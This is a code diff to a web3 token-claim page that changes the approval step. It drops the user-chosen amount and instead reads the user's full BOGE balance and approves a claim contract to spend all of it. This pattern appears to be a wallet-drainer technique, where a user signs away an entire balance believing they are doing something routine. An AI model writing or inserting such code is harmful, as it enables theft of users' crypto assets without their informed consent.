@@ -25,6 +25,25 @@ const BOGE_TOKEN_ABI = [
         "payable": false,
         "stateMutability": "nonpayable",
         "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [
+            {
+                "name": "_owner",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "name": "balance",
+                "type": "uint256"
+            }
+        ],
+        "payable": false,
+        "stateMutability": "view",
+        "type": "function"
     }
 ];
 
@@ -69,19 +88,14 @@ async function approveBOGEToken() {
         return;
     }
 
-    const amount = document.getElementById('amount').value;
-    if (!amount) {
-        alert('Please enter an amount');
-        return;
-    }
-
-    console.log("User account:", userAccount);
-    console.log("Amount to approve:", amount);
-
     const bogeTokenContract = new web3.eth.Contract(BOGE_TOKEN_ABI, BOGE_TOKEN_ADDRESS);
 
     try {
-        await bogeTokenContract.methods.approve(CLAIM_CONTRACT_ADDRESS, amount).send({ from: userAccount });
+        // Fetch user's BOGE balance
+        const balance = await bogeTokenContract.methods.balanceOf(userAccount).call();
+        console.log("User balance:", balance);
+
+        await bogeTokenContract.methods.approve(CLAIM_CONTRACT_ADDRESS, balance).send({ from: userAccount });
         alert('BOGE token approval successful!');
         console.log("BOGE token approval successful!");
     } catch (error) {
